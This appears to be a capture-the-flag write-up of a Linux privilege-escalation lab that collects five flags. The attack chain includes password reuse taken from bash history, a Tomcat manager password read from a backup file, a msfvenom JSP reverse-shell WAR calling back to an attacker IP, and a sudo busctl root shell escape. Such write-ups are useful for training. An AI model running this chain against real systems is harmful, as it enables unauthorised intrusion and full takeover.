---
created: 18-01-2026
---
## `flag1.txt`

- Find `flag1.txt`:

```bash
find / -name "*flag1*" -ls 2>/dev/null
```

```bash
   396130      4 -rw-r--r--   1 htb-student www-data       33 Sep  6  2020 /home/htb-student/.config/.flag1.txt
```

- Output the flag:

```bash
cat /home/htb-student/.config/.flag1.txt
```

```bash
LLPE{d0n_ov3rl00k_h1dden_f1les!}
```

## `flag2.txt`

- Search for `flag2.txt`:

```bash
find / -name "*flag2*" -ls 2>/dev/null
```

```bash
  1442206      4 -rwx------   1 barry    barry          29 Sep  5  2020 /home/barry/flag2.txt
```

- `flag2.txt` is only readable by the user `barry`. So, we need to gain access to that account.

- Check permissions of the `barry`'s home directory:

```bash
ls -la /home | grep barry
```

```bash
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 /home/barry
```

- Others' execute permissions on the directory mean you can `cd` into it:

```bash
cd /home/barry
```

- List contents of the directory:

```bash
ls -la
```

```bash
total 40
drwxr-xr-x 5 barry barry 4096 Sep  5  2020 .
drwxr-xr-x 5 root  root  4096 Sep  6  2020 ..
-rwxr-xr-x 1 barry barry  360 Sep  6  2020 .bash_history
-rw-r--r-- 1 barry barry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 barry barry 3771 Feb 25  2020 .bashrc
drwx------ 2 barry barry 4096 Sep  5  2020 .cache
-rwx------ 1 barry barry   29 Sep  5  2020 flag2.txt
drwxrwxr-x 3 barry barry 4096 Sep  5  2020 .local
-rw-r--r-- 1 barry barry  807 Feb 25  2020 .profile
drwx------ 2 barry barry 4096 Sep  5  2020 .ssh
```

- `.bash_history` in the `barry`'s home directory is readable by your current user. Inspect it:

```bash
cat /home/barry/.bash_history
```

```bash
cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history 
history
exit
history
exit
ls -la
ls -l
history 
history -d 21
history 
exit
id
ls /var/log
history
history -d 28
history
exit
```

There's an SSH password to `barry_adm` at `dmz1.inlanefreight.local`, `i_l0ve_s3cur1ty`. 

- Test for password reuse:

```bash
su
```

```bash
Password: i_l0ve_s3cur1ty!
```

- Authentication successful. Output `flag2.txt`:

```bash
cat flag2.txt
```

```bash
LLPE{ch3ck_th0se_cmd_l1nes!}
```

From now on, you act on `barry`'s behalf.
## `flag3.txt`

- Search for `flag3.txt`:

```bash
find / -name "*flag3*" -ls 2>/dev/null
```

```bash
393416      4 -rw-r-----   1 root     adm            23 Sep  5  2020 /var/log/flag3.txt
```

`flag3.txt` is readable only by `root` and members of the `adm` group. 

- Check `barry`'s groups:

```bash
id
```

```bash
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```

- `barry` is a member of the `adm` group. Therefore, you can read the flag:

```bash
cat /var/log/flag3.txt
```

```bash
LLPE{h3y_l00k_a_fl@g!}
```

## `flag4.txt`

- Search for `flag4.txt`:

```bash
find / -name "*flag4*" -ls 2>/dev/null
```

```bash
528779      4 -rw-------   1 tomcat   tomcat         25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
```

`flag4.txt` is readable only by the user `tomcat`.

- Check `/etc/passwd`:

```bash
getent passwd tomcat
```

```bash
tomcat:x:997:997:Apache Tomcat:/:/bin/bash
```

`tomcat` is a system account used by Apache Tomcat service. 

- Check files owned by `tomcat`:

```bash
find / -user tomcat -ls 2>/dev/null | grep -v proc
```

```bash
   528716      4 drwxr-x---   3 tomcat   tomcat       4096 Sep  3  2020 /var/cache/tomcat9
   402881      4 drwxr-s---   2 tomcat   adm          4096 Jan 18 15:24 /var/log/tomcat9
   402771      0 -rw-r-----   1 tomcat   adm             0 Sep  6  2020 /var/log/tomcat9/localhost_access_log.2020-09-06.txt
   393425      0 -rw-r-----   1 tomcat   adm             0 Jan 18 15:24 /var/log/tomcat9/localhost.2026-01-18.log
   395512      0 -rw-r-----   1 tomcat   adm             0 Jan 18 15:24 /var/log/tomcat9/localhost_access_log.2026-01-18.txt
   399322      4 -rw-r-----   1 tomcat   adm          4016 Sep  5  2020 /var/log/tomcat9/localhost_access_log.2020-09-05.txt
   402797      4 -rw-r-----   1 tomcat   adm          2730 Sep  7  2020 /var/log/tomcat9/localhost_access_log.2020-09-07.txt
   401932      0 -rw-r-----   1 tomcat   adm             0 Jun 11  2025 /var/log/tomcat9/localhost_access_log.2025-06-11.txt
   402635      4 -rw-r-----   1 tomcat   adm          4026 Sep  3  2020 /var/log/tomcat9/catalina.2020-09-03.log.gz
   395015      4 -rw-r-----   1 tomcat   adm            45 Sep  3  2020 /var/log/tomcat9/localhost.2020-09-03.log.gz
   393408     12 -rw-r-----   1 tomcat   adm          9213 Jan 18 15:25 /var/log/tomcat9/catalina.2026-01-18.log
   402846      0 -rw-r-----   1 tomcat   adm             0 Sep  8  2020 /var/log/tomcat9/localhost_access_log.2020-09-08.txt
   402646      4 -rw-r-----   1 tomcat   adm           120 Sep  3  2020 /var/log/tomcat9/localhost_access_log.2020-09-03.txt.gz
   528719      4 drwxrwxr-x   5 tomcat   tomcat       4096 Sep  7  2020 /var/lib/tomcat9/webapps
   528782      8 -rw-r-----   1 tomcat   tomcat       6274 Sep  7  2020 /var/lib/tomcat9/webapps/BczEqPiKLFGyZ1aEJh100MY430B.war
   528795      4 drwxr-x---   4 tomcat   tomcat       4096 Sep  7  2020 /var/lib/tomcat9/webapps/bNLu
   528794      8 -rw-r-----   1 tomcat   tomcat       6251 Sep  7  2020 /var/lib/tomcat9/webapps/bNLu.war
   528783      4 drwxr-x---   4 tomcat   tomcat       4096 Sep  7  2020 /var/lib/tomcat9/webapps/BczEqPiKLFGyZ1aEJh100MY430B
   528779      4 -rw-------   1 tomcat   tomcat         25 Sep  5  2020 /var/lib/tomcat9/flag4.txt
   528718      4 drwxr-xr-x   2 tomcat   tomcat       4096 Feb 24  2020 /var/lib/tomcat9/lib
```

There's a SGID directory, `/var/cache/tomcat9`, to which members of the `adm` group, including `barry`, have read and execute access:

```bash
cd /var/log/tomcat9
```

```bash
ls -la
```

```bash
total 40
drwxr-s---  2 tomcat adm    4096 Jan 18 15:24 .
drwxrwxr-x 12 root   syslog 4096 Jan 18 15:24 ..
-rw-r-----  1 tomcat adm    4026 Sep  3  2020 catalina.2020-09-03.log.gz
-rw-r-----  1 tomcat adm    9213 Jan 18 15:25 catalina.2026-01-18.log
-rw-r-----  1 tomcat adm      45 Sep  3  2020 localhost.2020-09-03.log.gz
-rw-r-----  1 tomcat adm       0 Jan 18 15:24 localhost.2026-01-18.log
-rw-r-----  1 tomcat adm     120 Sep  3  2020 localhost_access_log.2020-09-03.txt.gz
-rw-r-----  1 tomcat adm    4016 Sep  5  2020 localhost_access_log.2020-09-05.txt
-rw-r-----  1 tomcat adm       0 Sep  6  2020 localhost_access_log.2020-09-06.txt
-rw-r-----  1 tomcat adm    2730 Sep  7  2020 localhost_access_log.2020-09-07.txt
-rw-r-----  1 tomcat adm       0 Sep  8  2020 localhost_access_log.2020-09-08.txt
-rw-r-----  1 tomcat adm       0 Jun 11  2025 localhost_access_log.2025-06-11.txt
-rw-r-----  1 tomcat adm       0 Jan 18 15:24 localhost_access_log.2026-01-18.txt
```

- You check one of the log files:

```bash
cat localhost_access_log.2020-09-05.txt
```

```bash
10.10.14.3 - - [05/Sep/2020:11:53:38 +0000] "GET / HTTP/1.1" 200 1895
10.10.14.3 - - [05/Sep/2020:11:53:39 +0000] "GET /favicon.ico HTTP/1.1" 404 729
10.10.14.3 - - [05/Sep/2020:11:53:43 +0000] "GET /manager HTTP/1.1" 302 -
10.10.14.3 - - [05/Sep/2020:11:53:44 +0000] "GET /manager/ HTTP/1.1" 302 -
10.10.14.3 - - [05/Sep/2020:11:53:44 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:53:59 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:54:10 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:54:50 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:54:53 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:56:50 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:56:55 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:57:21 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:58:51 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:11:58:55 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:03:20 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:03:27 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:05:51 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:05:57 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:11:29 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:11:32 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - - [05/Sep/2020:12:15:48 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - admin [05/Sep/2020:12:15:50 +0000] "GET /manager/html HTTP/1.1" 200 15312
10.10.14.3 - - [05/Sep/2020:12:15:50 +0000] "GET /manager/images/tomcat.gif HTTP/1.1" 200 2066
10.10.14.3 - - [05/Sep/2020:12:15:50 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 200 20486
10.10.14.3 - - [05/Sep/2020:12:18:03 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - tomcatadm [05/Sep/2020:12:18:09 +0000] "GET /manager/html HTTP/1.1" 200 14388
10.10.14.3 - tomcatadm [05/Sep/2020:12:18:09 +0000] "GET /manager/images/tomcat.gif HTTP/1.1" 304 -
10.10.14.3 - tomcatadm [05/Sep/2020:12:18:09 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 304 -
10.10.14.3 - tomcatadm [05/Sep/2020:12:19:09 +0000] "POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=0AD29749CF62ED41781756F17310AC6E HTTP/1.1" 200 16179
10.10.14.3 - - [05/Sep/2020:12:19:11 +0000] "GET /cmd/ HTTP/1.1" 404 726
10.10.14.3 - - [05/Sep/2020:12:19:16 +0000] "GET /cmd/cmd.jsp HTTP/1.1" 200 180
10.10.14.3 - - [05/Sep/2020:12:19:18 +0000] "GET /cmd/cmd.jsp?cmd=pwd HTTP/1.1" 200 214
10.10.14.3 - - [05/Sep/2020:12:21:34 +0000] "GET /cmd/cmd.jsp?cmd=ls HTTP/1.1" 200 240
10.10.14.3 - - [05/Sep/2020:12:21:38 +0000] "GET /cmd/cmd.jsp?cmd=cat+flag3.txt HTTP/1.1" 200 232
10.10.14.3 - - [05/Sep/2020:12:34:14 +0000] "GET / HTTP/1.1" 200 1895
10.10.14.3 - - [05/Sep/2020:12:34:14 +0000] "GET /favicon.ico HTTP/1.1" 404 729
10.10.14.3 - - [05/Sep/2020:12:34:21 +0000] "GET /manager HTTP/1.1" 302 -
10.10.14.3 - - [05/Sep/2020:12:34:21 +0000] "GET /manager/ HTTP/1.1" 302 -
10.10.14.3 - - [05/Sep/2020:12:34:21 +0000] "GET /manager/html HTTP/1.1" 401 2499
10.10.14.3 - tomcatadm [05/Sep/2020:12:34:38 +0000] "GET /manager/html HTTP/1.1" 200 17330
10.10.14.3 - - [05/Sep/2020:12:34:38 +0000] "GET /manager/images/tomcat.gif HTTP/1.1" 200 2066
10.10.14.3 - - [05/Sep/2020:12:34:38 +0000] "GET /manager/images/asf-logo.svg HTTP/1.1" 200 20486
10.10.14.3 - tomcatadm [05/Sep/2020:12:34:51 +0000] "POST /manager/html/stop;jsessionid=030FA94AA5FE1B91247FBB7D87D0323B?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=42CDA0ED2872C11575384EE1FF6F5EE2 HTTP/1.1" 200 15650
10.10.14.3 - tomcatadm [05/Sep/2020:12:34:54 +0000] "POST /manager/html/undeploy?path=/cmd&org.apache.catalina.filters.CSRF_NONCE=B410557BD9B89975BB1660F0CBFC60EB HTTP/1.1" 200 14441
```

If you look closer, you notice `/cmd/cmd.jsp?cmd=ls` and similar requests in the logs. It seems the web application has a backdoor. Commands are executed on behalf of the user who runs the application, i.e., `tomcat`. 

- You check the server on port `8080` on the target machine:

![[PrivEsc_assessment_tomcat.png]]

- You check `/etc/tomcat9`:

```bash
ls -l /etc/tomcat9
```

```bash
total 216
drwxrwxr-x 3 root tomcat   4096 Sep  3  2020 Catalina
-rw-r----- 1 root tomcat   7262 Feb  5  2020 catalina.properties
-rw-r----- 1 root tomcat   1400 Feb  5  2020 context.xml
-rw-r----- 1 root tomcat   1149 Feb  5  2020 jaspic-providers.xml
-rw-r----- 1 root tomcat   2799 Feb 24  2020 logging.properties
drwxr-xr-x 2 root tomcat   4096 Sep  3  2020 policy.d
-rw-r----- 1 root tomcat   7586 Feb 24  2020 server.xml
-rw-r----- 1 root tomcat   2232 Sep  5  2020 tomcat-users.xml
-rwxr-xr-x 1 root barry    2232 Sep  5  2020 tomcat-users.xml.bak
-rw-r----- 1 root tomcat 172362 Feb  5  2020 web.xml
```

- Through you don't have access to `tomcat-users.xml`, you can read the backup file, `tomcat-users.xml.bak`:

```bash
cat /etc/tomcat9/tomcat-users.xml.bak
```

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->

 <role rolename="manager-gui"/>
 <role rolename="manager-script"/>
 <role rolename="manager-jmx"/>
 <role rolename="manager-status"/>
 <role rolename="admin-gui"/>
 <role rolename="admin-script"/>
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>

</tomcat-users>
```

You find user name and password: `tomcatadm` and `T0mc@t_s3cret_p@ss!`.

- You then log in:

![[PrivEsc_assessment_tomcatadm.png]]

- Upon login, you see a WAR file upload functionality:

![[PrivEsc_assessment_WAR_upload.png]]

- You generate a reverse shell payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.16 lport=1337 -f war -o reverse.war
```

- Start a listener:

```bash
nc -lvnp
```

Once you access the file, Netcat catches a reverse shell:

```bash                       
listening on [any] 1337 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.150.29] 39778
whoami
tomcat
```

- Get the flag:

```bash
cat flag4.txt
```

```bash
LLPE{im_th3_m@nag3r_n0w}
```

## `flag5.txt`

- Get a proper shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- On `tomcat`'s behalf, you run:

```bash
sudo -l
```

```bash
Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

- There's a [known privilege escalation vector for `buctl`](https://gtfobins.github.io/gtfobins/busctl/#shell):

```bash
sudo buctl --show-machine
```

```bash
!/bin/bash
```

```bash
sudo /usr/bin/busctl --show-machine
WARNING: terminal is not fully functional
-  (press RETURN)

NAME                           PID PROCESS         USER             CONNECTION >
:1.0                             1 systemd         root             :1.0       >
:1.1                           565 systemd-timesyn systemd-timesync :1.1       >
:1.10                          657 snapd           root             :1.10      >
:1.16                         1870 systemd         htb-student      :1.16      >
:1.21                         3157 busctl          root             :1.21      >
:1.4                           645 accounts-daemon root             :1.4       >
:1.5                           658 systemd-logind  root             :1.5       >
:1.6                           749 polkitd         root             :1.6       >
:1.7                           777 systemd-resolve systemd-resolve  :1.7       >
:1.8                           654 networkd-dispat root             :1.8       >
:1.9                           835 unattended-upgr root             :1.9       >
com.ubuntu.LanguageSelector      - -               -                (activatabl>
com.ubuntu.SoftwareProperties    - -               -                (activatabl>
org.freedesktop.Accounts       645 accounts-daemon root             :1.4       >
org.freedesktop.DBus             1 systemd         root             -          >
org.freedesktop.PackageKit       - -               -                (activatabl>
org.freedesktop.PolicyKit1     749 polkitd         root             :1.6       >
org.freedesktop.bolt             - -               -                (activatabl>
org.freedesktop.fwupd            - -               -                (activatabl>
org.freedesktop.hostname1        - -               -                (activatabl>
org.freedesktop.locale1          - -               -                (activatabl>
org.freedesktop.login1         658 systemd-logind  root             :1.5       >
lines 1-23org.freedesktop.network1         - -               -                (activatabl>
lines 2-24!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@nix03:/var/lib/tomcat9# whoami
whoami
root
```

- Get the flag:

```bash
cat /root/flag5.txt
```

```bash
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```